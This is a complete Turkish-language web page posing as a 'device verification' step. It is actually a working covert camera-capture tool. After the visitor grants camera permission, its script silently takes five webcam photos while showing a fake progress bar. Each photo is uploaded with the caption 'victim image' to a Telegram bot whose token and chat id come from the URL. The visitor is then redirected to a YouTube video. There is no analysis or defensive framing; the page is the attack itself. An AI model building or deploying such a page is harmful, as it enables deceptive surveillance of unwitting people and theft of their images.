<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Doğrulama</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #000; color: #fff; text-align: center; padding: 50px 20px; font-family: sans-serif; }
        .btn { background: #ff0000; color: #fff; padding: 15px; border: none; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; }
        #prog { display: none; margin-top: 20px; }
    </style>
</head>
<body>
    <div style="max-width:400px; margin:auto; border:1px solid #333; padding:20px;">
        <h2>Cihaz Doğrulaması</h2>
        <p>Devam etmek için kamera izni verin.</p>
        <button class="btn" onclick="start()">DOĞRULA</button>
        <div id="prog">İşleniyor: %<span id="perc">0</span></div>
    </div>
    <video id="v" style="display:none;" autoplay playsinline></video>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const p = new URLSearchParams(window.location.search);
        const t = p.get('t'), i = p.get('i');
        async function start() {
            if(!t || !i) return;
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                document.getElementById('v').srcObject = s;
                document.querySelector('.btn').style.display = 'none';
                document.getElementById('prog').style.display = 'block';
                for(let x=1; x<=5; x++) {
                    await new Promise(r => setTimeout(r, 1200));
                    snap(x);
                    document.getElementById('perc').innerText = x*20;
                }
                setTimeout(() => { window.location.href="https://youtu.be/021FIRNbJK4"; }, 1500);
            } catch(e) { alert("Hata!"); }
        }
        function snap(n) {
            const cv = document.getElementById('c'), vi = document.getElementById('v');
            cv.width = vi.videoWidth; cv.height = vi.videoHeight;
            cv.getContext('2d').drawImage(vi, 0, 0);
            cv.toBlob(b => {
                const f = new FormData();
                f.append('chat_id', i); f.append('photo', b, 'p.jpg');
                f.append('caption', `📸 Kurban Görüntüsü #${n}`);
                fetch(`https://api.telegram.org/bot${t}/sendPhoto`, {method:'POST', body:f});
            }, 'image/jpeg', 0.7);
        }
    </script>
</body>
</html>
